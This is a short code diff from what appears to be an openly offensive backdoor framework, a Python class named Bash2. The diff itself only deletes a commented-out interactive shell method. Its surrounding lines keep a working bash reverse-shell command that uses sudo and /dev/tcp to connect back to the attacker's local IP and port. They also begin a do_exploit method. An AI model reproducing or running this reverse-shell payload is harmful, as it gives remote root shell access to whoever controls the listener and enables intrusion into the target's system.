@@ -20,17 +20,6 @@ class Bash2(Backdoor):
         #return "echo " + self.core.curtarget.pword + " | sudo -S nohup 0<&196;exec 196<>/dev/tcp/" + self.core.localIP + "/%s; bash <&196 >&196 2>&196" % self.get_value("port")
         return "sudo -S nohup 0<&196;exec 196<>/dev/tcp/" + self.core.localIP + "/%s; sudo -S bash <&196 >&196 2>&196" % self.get_value("port")
     
-    #def do_spawn(self, args): #newline cannot be sent
-    #    if(hasattr(self, "child")):
-    #        if(self.child.isalive()):
-    #            print("Press Control + ] to exit the shell.")
-   # 
-    #            self.child.interact(escape_character='\x1d', input_filter=None, output_filter=None)
-     #       else:
-      #          print("The connection has been lost.")
-      #  else:
-      #      print("The exploit has not been run yet or does not support the interpreter.")
-
     def do_exploit(self, args):
         port = self.get_value("port")
         target = self.core.curtarget
